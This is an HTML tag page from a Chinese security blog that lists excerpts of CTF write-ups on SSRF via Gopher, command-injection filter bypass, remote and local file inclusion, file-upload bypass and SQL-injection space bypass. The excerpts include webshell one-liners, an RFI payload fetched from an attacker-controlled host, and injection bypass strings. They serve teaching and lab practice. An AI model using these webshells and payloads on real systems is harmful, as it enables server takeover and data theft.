@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/san-blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=san-blog/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>CTF | 东阳的安全笔记</title>
+<meta name="keywords" content="">
+<meta name="description" content="数据安全与网络安全技术分享">
+<meta name="author" content="东阳">
+<link rel="canonical" href="http://localhost:1313/san-blog/tags/ctf/">
+<link crossorigin="anonymous" href="/san-blog/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/san-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/san-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/san-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/san-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/san-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="http://localhost:1313/san-blog/tags/ctf/index.xml" title="rss">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/san-blog/tags/ctf/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body class="list" id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/san-blog/" accesskey="h" title="东阳的安全笔记 (Alt + H)">东阳的安全笔记</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/san-blog/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/posts/" title="文章">
+                    <span>文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main"> 
+<header class="page-header"><nav class="breadcrumbs" role="navigation" aria-label="Breadcrumb">
+            <a href="/san-blog/">Home</a>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+            <a href="/san-blog/tags/">Tags</a>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+        <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+</nav>
+  <h1>
+    CTF
+    <a href="/san-blog/tags/ctf/index.xml" title="RSS" aria-label="RSS">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" height="23">
+        <path d="M4 11a9 9 0 0 1 9 9" />
+        <path d="M4 4a16 16 0 0 1 16 16" />
+        <circle cx="5" cy="19" r="1" />
+      </svg>
+    </a>
+  </h1>
+</header>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CTFHub SSRF 实战：Gopher 协议文件上传与工具化利用
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>一、题目信息 平台：CTFHub 分类：Skill / Web / SSRF / 文件上传 考点：SSRF（服务器端请求伪造）、Gopher 协议、multipart/form-data 报文构造、文件上传 题目场景：存在一个 ?url= 参数，服务器会代为请求用户指定的地址。目标 flag.php 限制仅本地访问，且需要 POST 上传一个非空文件。
+二、源码分析 通过 Gopher GET 请求访问 flag.php，拿到源码：
+&lt;?php error_reporting(0); if($_SERVER[&#34;REMOTE_ADDR&#34;] != &#34;127.0.0.1&#34;){ echo &#34;Just View From 127.0.0.1&#34;; return; } if(isset($_FILES[&#34;file&#34;]) &amp;&amp; $_FILES[&#34;file&#34;][&#34;size&#34;] &gt; 0){ echo getenv(&#34;CTFHUB&#34;); exit; } ?&gt; 关键限制 条件 说明 REMOTE_ADDR != 127.0.0.1 外部直接访问被拒绝，必须是本机请求 isset($_FILES[&#34;file&#34;]) 必须是文件上传请求（multipart/form-data） $_FILES[&#34;file&#34;][&#34;size&#34;] &gt; 0 上传的文件不能为空 三、攻击思路 3.1 绕过本地访问限制 和之前的 POST key 题型一样，利用 SSRF 让服务器自己请求自己：
+攻击者 -&gt; ?url=gopher://127.0.0.1:80/_... -&gt; 服务器代为请求 -&gt; flag.php 此时 $_SERVER[&#34;REMOTE_ADDR&#34;] 就是 127.0.0.1，通过第一重验证。
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-09 22:55:00 +0800 CST'>June 9, 2026</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>431 words</span>&nbsp;·&nbsp;<span>东阳</span></footer>
+  <a class="entry-link" aria-label="post link to CTFHub SSRF 实战：Gopher 协议文件上传与工具化利用" href="http://localhost:1313/san-blog/posts/ctfhub-ssrf-file-upload-gopher-tool/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CTFHub SSRF 实战：Gopher 协议构造 POST 请求绕过本地限制
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>一、题目信息 平台：CTFHub 分类：Skill / Web / SSRF 考点：SSRF（服务器端请求伪造）、Gopher 协议、双重 URL 编码、HTTP 报文构造 题目场景：存在一个 ?url= 参数，服务器会代为请求用户指定的地址。目标 flag.php 限制仅本地访问，且需要 POST 提交正确的 key。
+二、SSRF 原理 2.1 什么是 SSRF？ SSRF（Server-Side Request Forgery，服务器端请求伪造）是指攻击者通过服务端应用，向服务端所在网络或本地发起请求的攻击方式。
+在本题中，?url= 参数就是 SSRF 的注入点。服务器接收到用户传入的 URL 后，使用自身的 HTTP Client（如 PHP 的 file_get_contents() 或 curl）去请求该地址，并将结果返回给用户。
+2.2 为什么能访问 127.0.0.1？ 访问控制通常发生在多个层级：
+层级 控制方式 本题情况 网络层 (L3) iptables / 防火墙 未限制回环接口 传输层 (L4) TCP 监听绑定 Apache 绑定 0.0.0.0:80，本地可连 应用层 (L7) PHP 代码逻辑 flag.php 仅检查 $_SERVER[&#39;REMOTE_ADDR&#39;] === &#39;127.0.0.1&#39; 当服务端代码发起请求时，它的身份是服务器进程，出站连接的源地址是 127.0.0.1，因此满足 flag.php 的本地访问控制策略。
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-09 21:43:00 +0800 CST'>June 9, 2026</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>585 words</span>&nbsp;·&nbsp;<span>东阳</span></footer>
+  <a class="entry-link" aria-label="post link to CTFHub SSRF 实战：Gopher 协议构造 POST 请求绕过本地限制" href="http://localhost:1313/san-blog/posts/ctfhub-ssrf-gopher-post-exploit/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">命令注入综合过滤绕过实战：从空格到管道的一条龙
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>题目信息 类型：Web / 命令注入（Command Injection） 考点：黑名单过滤绕过、Shell 语法特性、编码与通配符 核心漏洞：exec() 直接拼接用户输入，黑名单过滤存在遗漏 源码分析 题目给了一段典型的命令注入代码，过滤规则逐步加强：
+第一版：只过滤 / if (!preg_match_all(&#34;/\//&#34;, $ip, $m)) { $cmd = &#34;ping -c 4 {$ip}&#34;; exec($cmd, $res); } 分析：只防了斜杠，但命令注入绝大多数情况下根本不需要 /。;id、$(id)、`id` 直接通杀。
+第二版：过滤 | 和 &amp; if (!preg_match_all(&#34;/(\||\&amp;)/&#34;, $ip, $m)) { exec(&#34;ping -c 4 {$ip}&#34;, $res); } 分析：禁了管道和后台执行，但 ; 完全没防，而且 $() 也无需任何分隔符。
+第三版：综合过滤（核心挑战） if (!preg_match_all(&#34;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&#34;, $ip, $m)) { $cmd = &#34;ping -c 4 {$ip}&#34;; exec($cmd, $res); } 黑名单：|、&amp;、;、空格、/、cat、flag、ctfhub
+绕过技巧拆解 1. 空格绕过：${IFS} ${IFS} 是 shell 的内置变量（Internal Field Separator），默认值包含空格、Tab、换行。在命令中可以直接代替空格。
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-09 01:00:00 +0800 CST'>June 9, 2026</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>383 words</span>&nbsp;·&nbsp;<span>东阳</span></footer>
+  <a class="entry-link" aria-label="post link to 命令注入综合过滤绕过实战：从空格到管道的一条龙" href="http://localhost:1313/san-blog/posts/command-injection-filter-bypass/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CTFHub RFI 远程文件包含漏洞利用详解
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>题目信息 类型：Web / 文件包含漏洞 靶场：CTFHub 核心漏洞：远程文件包含（Remote File Inclusion, RFI） 目标：通过 RFI 获取服务器 shell 并读取 flag 隐私声明：本文中所有敏感 IP 地址均已做屏蔽处理，统一替换为 xxx.xxx.xxx.xxx，避免暴露真实目标资产。
+漏洞分析 远程文件包含（RFI）是 PHP 文件包含漏洞的一种高危利用方式。当应用程序使用 include()、require() 等函数加载文件时，如果用户可控的参数未经过严格过滤，攻击者就可以构造恶意 URL，让服务器加载并执行远程服务器上的 PHP 脚本。
+本题的关键利用点：
+页面存在 ?file= 参数，用于指定要包含的文件路径 服务器配置中 allow_url_include 或 allow_url_fopen 开启，允许包含远程 URL 攻击者可以在自己控制的服务器上托管恶意 PHP 代码，通过 ?file=http://xxx.xxx.xxx.xxx:8000/yjh.txt 触发执行 利用步骤 1. 准备恶意payload 在攻击者可控的服务器（IP：xxx.xxx.xxx.xxx，端口：8000）上放置文件 yjh.txt，内容如下：
+&lt;?php system(&#34;cat /flag&#34;); ?&gt; 注意：文件名使用了 .txt 后缀，这是为了绕过部分简单的后缀检测。由于 PHP 的 include() 函数在包含远程文件时会执行其中的 PHP 代码，因此即使后缀是 .txt，其中的 PHP 代码依然会被解析执行。
+2. 发送包含请求 通过 Postman 或浏览器构造请求：
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-06 10:00:00 +0800 CST'>June 6, 2026</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>208 words</span>&nbsp;·&nbsp;<span>东阳</span></footer>
+  <a class="entry-link" aria-label="post link to CTFHub RFI 远程文件包含漏洞利用详解" href="http://localhost:1313/san-blog/posts/ctfhub-rfi-shell/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">php://filter 伪协议：在文件包含中读取源代码
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>一、php://filter 是什么 php://filter 是 PHP 提供的一种元封装协议（meta wrapper），用于在访问数据流时对数据进行过滤和转换。
+与 php://input 不同，php://filter 的核心价值不在于执行代码，而在于以安全的方式读取文件内容——尤其是当目标文件是 PHP 源码时。
+二、为什么需要 php://filter 读取源码 假设存在如下漏洞代码：
+&lt;?php $file = $_GET[&#39;file&#39;]; include($file); // 用户可控！ ?&gt; 如果我们直接传入 ?file=index.php，会发生什么？
+GET /?file=index.php HTTP/1.1 include(&#39;index.php&#39;) 会执行 index.php 中的 PHP 代码，而不是显示它的源码。页面上看到的仍然是渲染后的 HTML 输出。
+那如何看到源码呢？
+答案就是 php://filter。利用它的编码过滤器，可以在 PHP 代码被执行前，先将文件内容进行 Base64 编码：
+?file=php://filter/read=convert.base64-encode/resource=index.php 这样返回的就是 Base64 编码后的源码字符串，而不是执行结果。
+三、基本语法结构 php://filter/&lt;action&gt;=&lt;filter_list&gt;/resource=&lt;target_file&gt; 组成部分 说明 read= / write= 对读取/写入的数据应用过滤器 filter_list 过滤器名称，支持链式调用（用 ` resource= 指定目标文件路径 3.1 常用过滤器 过滤器 功能 convert.base64-encode Base64 编码 convert.base64-decode Base64 解码 string.rot13 ROT13 编码 string.toupper 转大写 string.tolower 转小写 convert.iconv.* 字符集转换 四、实战案例：CTFHub 文件包含读源码 4.1 题目环境 URL: http://&lt;TARGET_IP&gt;:&lt;PORT&gt;/ 页面提示：
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-05 23:30:00 +0800 CST'>June 5, 2026</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>298 words</span>&nbsp;·&nbsp;<span>东阳</span></footer>
+  <a class="entry-link" aria-label="post link to php://filter 伪协议：在文件包含中读取源代码" href="http://localhost:1313/san-blog/posts/php-filter-read-source-code/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CTFHub 文件包含实战：利用一句话木马 getshell
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>一、题目信息 平台：CTFHub 分类：Skill / Web / RCE / 文件包含 考点：PHP include 函数、一句话木马、WebShell 连接 题目链接：https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html
+二、源码分析 进入题目后，直接给出了 PHP 源码：
+&lt;?php error_reporting(0); // 关闭报错显示 if (isset($_GET[&#39;file&#39;])) { // 接收 file 参数 if (strpos($_GET[&#39;file&#39;], &#34;flag&#34;) !== false) { // 如果包含 &#34;flag&#34; 字符串 echo &#34;hack&#34;; // 输出 hack，阻止访问 } else { include($_GET[&#39;file&#39;]); // 否则包含指定文件 } } ?&gt; 逻辑梳理 条件 结果 file 参数包含 &#34;flag&#34; 输出 hack，包含失败 file 参数不含 &#34;flag&#34; 执行 include($file) 核心考点：include() 函数的特性——不检查后缀，直接执行文件中的 PHP 代码。
+三、发现突破口 题目下方有一个提示链接，访问后得到 shell.txt：
+http://&lt;TARGET_IP&gt;:&lt;PORT&gt;/shell.txt 内容是一句话木马：
+&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt; 连接密码：ctfhub 原理：eval() 函数将 $_REQUEST[&#39;ctfhub&#39;] 接收到的内容作为 PHP 代码执行 四、解题思路 4.1 include 函数的关键特性 假设 index.php 中执行了：
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-05 23:10:00 +0800 CST'>June 5, 2026</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>265 words</span>&nbsp;·&nbsp;<span>东阳</span></footer>
+  <a class="entry-link" aria-label="post link to CTFHub 文件包含实战：利用一句话木马 getshell" href="http://localhost:1313/san-blog/posts/ctfhub-file-inclusion-shell/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">php://input 文件包含漏洞利用：从原理到实战
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>一、php://input 是什么 php://input 是 PHP 提供的只读数据流包装器（wrapper），它允许开发者直接访问 HTTP 请求的原始请求体（raw POST data）。
+在文件包含漏洞的利用场景中，php://input 是一把利器：当我们能够控制 include() / require() 等函数的文件参数时，传入 php://input，PHP 就会把请求体中的内容当作 PHP 代码来解析执行。
+💡 关键前提：allow_url_include = On（PHP 5.x 部分默认开启，PHP 7&#43; 默认关闭）
+二、利用原理 假设存在如下存在漏洞的代码：
+&lt;?php $file = $_GET[&#39;file&#39;]; include($file); // 用户可控！ ?&gt; 当我们发送如下请求时：
+GET /?file=php://input HTTP/1.1 Host: target.com Content-Length: 29 &lt;?php system(&#34;whoami&#34;); ?&gt; 执行流程如下：
+$_GET[&#39;file&#39;] 获取到字符串 &#34;php://input&#34; include(&#34;php://input&#34;) 打开 php://input 数据流 PHP 从 HTTP 请求体中读取内容：&lt;?php system(&#34;whoami&#34;); ?&gt; 读取到的内容被当作 PHP 代码包含并执行 system(&#34;whoami&#34;) 被执行，返回当前系统用户 三、实战案例：CTFHub 文件包含 下面结合一道 CTFHub 真题，完整走一遍利用流程。
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-05 22:50:00 +0800 CST'>June 5, 2026</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>299 words</span>&nbsp;·&nbsp;<span>东阳</span></footer>
+  <a class="entry-link" aria-label="post link to php://input 文件包含漏洞利用：从原理到实战" href="http://localhost:1313/san-blog/posts/php-input-file-inclusion/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">文件上传绕过技法全解：从无验证到双写后缀的七种攻击面
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>一、前言 文件上传漏洞是 Web 安全中最常见的高危漏洞之一。实际环境中，服务端往往不会「完全不设防」，而是部署了多层校验。本题图梳理了文件上传从「无验证」到「双写后缀」的完整攻击链路，本文将逐一拆解图中高亮的 七种绕过技法，配合真实代码和 Payload，形成可落地的利用手册。
+二、无验证 2.1 漏洞特征 服务端对用户上传的文件不做任何校验，直接保存到可访问目录。
+$target = &#34;upload/&#34; . $_FILES[&#34;file&#34;][&#34;name&#34;]; move_uploaded_file($_FILES[&#34;file&#34;][&#34;tmp_name&#34;], $target); 2.2 利用方式 直接上传 PHP 一句话木马即可：
+&lt;?php eval($_POST[&#39;cmd&#39;]); ?&gt; 访问 http://target/upload/shell.php，蚁剑或 curl 直接连接。
+2.3 为什么还存在 常见于：
+后台管理系统的「临时上传」功能 内网测试环境未清理的接口 前后端分离架构中，前端直传 OSS 但回显了内网地址 三、前端验证绕过 3.1 漏洞特征 校验逻辑只写在浏览器端 JavaScript 中，后端 PHP 未做任何校验：
+function checkFile() { var allow_ext = &#34;.jpg|.png|.gif&#34;; var ext = file.substring(file.lastIndexOf(&#34;.&#34;)); if (allow_ext.indexOf(ext &#43; &#34;|&#34;) == -1) { alert(&#34;该文件不允许上传&#34;); return false; } } 3.2 绕过方式 方法一：禁用浏览器 JavaScript
+Chrome DevTools → Settings → Debugger → Disable JavaScript。
+方法二：Burp 抓包修改
+先选择合法的 .jpg 文件通过前端校验，Burp 拦截后将文件名改为 shell.php。
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-05 00:00:00 +0800 CST'>June 5, 2026</span>&nbsp;·&nbsp;<span>4 min</span>&nbsp;·&nbsp;<span>671 words</span>&nbsp;·&nbsp;<span>东阳</span></footer>
+  <a class="entry-link" aria-label="post link to 文件上传绕过技法全解：从无验证到双写后缀的七种攻击面" href="http://localhost:1313/san-blog/posts/file-upload-bypass-techniques/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">文件上传漏洞实战：从无验证到 Getshell 的完整流程
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>一、什么是文件上传漏洞 文件上传漏洞是指 Web 应用程序允许用户上传文件，但没有对上传文件的类型、内容、后缀等进行充分校验，导致攻击者可以上传恶意文件（如 Web Shell），进而控制服务器的安全漏洞。
+1.1 漏洞的本质 正常业务场景中，用户上传头像、文档、图片等文件，服务端将其保存到服务器目录。如果服务端信任了用户上传的所有文件，攻击者就可以上传一个伪装成图片的 PHP 脚本，然后直接访问该脚本执行任意代码。
+1.2 典型的漏洞代码 // 无验证的文件上传 $target = &#34;upload/&#34; . basename($_FILES[&#34;file&#34;][&#34;name&#34;]); move_uploaded_file($_FILES[&#34;file&#34;][&#34;tmp_name&#34;], $target); 这段代码直接将用户上传的文件保存到 upload/ 目录，不做任何类型检查。上传 shell.php 后，访问 http://target.com/upload/shell.php 即可执行恶意代码。
+二、常见应用场景 文件上传漏洞通常出现在以下业务场景中：
+2.1 用户头像/资料上传 社交平台、论坛、博客系统允许用户上传头像、背景图。如果仅检查文件扩展名或 MIME 类型，攻击者可以通过修改后缀、伪造 MIME 等方式绕过。
+2.2 附件与文档管理 企业 OA 系统、邮件系统、网盘允许上传文档、压缩包。如果服务端对压缩包内的文件不做二次检查，攻击者可以上传包含 Web Shell 的 ZIP 文件。
+2.3 编辑器与富文本组件 富文本编辑器（如 UEditor、KindEditor）的图片上传功能，如果没有严格限制上传类型，可能成为 getshell 的入口。
+2.4 API 文件接口 前后端分离架构中，前端通过 API 上传文件到 OSS 或服务器。如果 API 没有校验文件类型，攻击者可以直接调用接口上传任意文件。
+三、环境判断：确定用什么木马 上传木马前，必须先判断目标环境的语言和中间件，否则上传的木马无法执行。
+3.1 判断方法 方法 操作 示例 URL 后缀 观察页面 URL index.php → PHP Wappalyzer 插件 浏览器插件自动检测 显示 PHP、Apache、Nginx 响应头 查看 X-Powered-By X-Powered-By: PHP/7.3.14 报错页面 触发 404 或报错 Fatal error: Uncaught Error → PHP 3.2 常见木马类型 环境 木马后缀 示例 PHP .php &lt;?php eval(@$_POST[&#39;a&#39;]); ?&gt; JSP .jsp &lt;% Runtime.getRuntime().exec(request.getParameter(&#34;cmd&#34;)); %&gt; ASP .asp &lt;% eval request(&#34;cmd&#34;) %&gt; ASPX .aspx &lt;%@ Page Language=&#34;Jscript&#34; %&gt; 四、一句话木马原理 4.1 PHP 一句话木马 &lt;?php eval(@$_POST[&#39;a&#39;]); ?&gt; 执行逻辑：
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-04 00:00:00 +0800 CST'>June 4, 2026</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>450 words</span>&nbsp;·&nbsp;<span>东阳</span></footer>
+  <a class="entry-link" aria-label="post link to 文件上传漏洞实战：从无验证到 Getshell 的完整流程" href="http://localhost:1313/san-blog/posts/file-upload-vulnerability/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">SQL 注入空格过滤绕过：原理、手法与 sqlmap 实战
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>一、什么是空格过滤 空格过滤是指目标系统（WAF、Web 应用代码或中间件）对 HTTP 请求中的空格字符进行检测、替换或删除，以阻止 SQL 注入攻击的一种防御手段。
+1.1 过滤的实现方式 代码层面
+// 直接删除所有空格 $input = str_replace(&#34; &#34;, &#34;&#34;, $_GET[&#39;id&#39;]); // 替换为空 $input = str_replace(&#34; &#34;, &#34;&#34;, $_GET[&#39;id&#39;]); // 正则匹配删除所有空白字符 $input = preg_replace(&#39;/\s&#43;/&#39;, &#39;&#39;, $_GET[&#39;id&#39;]); WAF 层面
+WAF 规则检测到 SQL 关键字（如 UNION、SELECT、AND）前后存在空格时，直接拦截请求。例如：
+规则：IF (request_body CONTAINS &#34;UNION SELECT&#34;) THEN BLOCK 此时攻击者如果不使用空格，而是写成 UNION/**/SELECT，规则可能无法匹配。
+1.2 为什么空格是关键 SQL 语句的语法结构依赖空格作为分隔符：
+SELECT id, name FROM users WHERE id = 1 AND status = &#39;active&#39; ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ 空格分隔关键字、标识符、运算符 当空格被删除后：
+SELECTid,nameFROMusersWHEREid=1ANDstatus=&#39;active&#39; 整条语句变成一团，MySQL 解析器无法识别各个 token，SQL 注入 payload 失效。
+二、空格过滤的绕过手法 空格过滤并非不可突破。SQL 解析器认可的「空白等价物」远不止空格一种。
+2.1 注释符 /**/ MySQL 支持 C 风格的多行注释 /**/，注释内容可以为空，效果等同于一个空格：
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-03 23:00:00 +0800 CST'>June 3, 2026</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>630 words</span>&nbsp;·&nbsp;<span>东阳</span></footer>
+  <a class="entry-link" aria-label="post link to SQL 注入空格过滤绕过：原理、手法与 sqlmap 实战" href="http://localhost:1313/san-blog/posts/sql-injection-space-filter-bypass/"></a>
+</article>
+<footer class="page-footer">
+  <nav class="pagination">
+    <a class="next" href="http://localhost:1313/san-blog/tags/ctf/page/2/">Next&nbsp;&nbsp;»
+    </a>
+  </nav>
+</footer>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/san-blog/">东阳的安全笔记</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
